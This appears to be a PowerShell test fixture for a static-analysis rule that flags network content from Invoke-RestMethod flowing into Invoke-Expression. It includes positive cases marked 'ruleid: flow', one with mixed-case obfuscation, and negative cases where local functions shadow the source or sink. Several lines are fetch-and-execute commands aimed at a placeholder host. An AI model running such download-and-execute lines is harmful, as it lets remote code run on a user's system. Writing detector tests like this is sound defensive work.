# ruleid: flow
Invoke-Expression (Invoke-RestMethod 'https://example.test')
# ruleid: flow
INVOKE-EXPRESSION (iNVoKe-ReStMEThod 'https://example.test')
function Use-LocalSource {
  function Invoke-RestMethod { return 'safe' }
  Invoke-Expression (Invoke-RestMethod 'https://example.test')
}
Use-LocalSource
function Use-LocalSink {
  function Invoke-Expression {
    param($Value)
    return $Value
  }
  Invoke-Expression (Invoke-RestMethod 'https://example.test')
}
Use-LocalSink
function Get-Displayed {
  Write-Host (Invoke-RestMethod 'https://example.test')
  return 'safe'
}
Invoke-Expression (Get-Displayed)
function Get-CustomOutput {
  function Write-Host {
    param($Value)
    return $Value
  }
  Write-Host (Invoke-RestMethod 'https://example.test')
}
# ruleid: flow
Invoke-Expression (Get-CustomOutput)
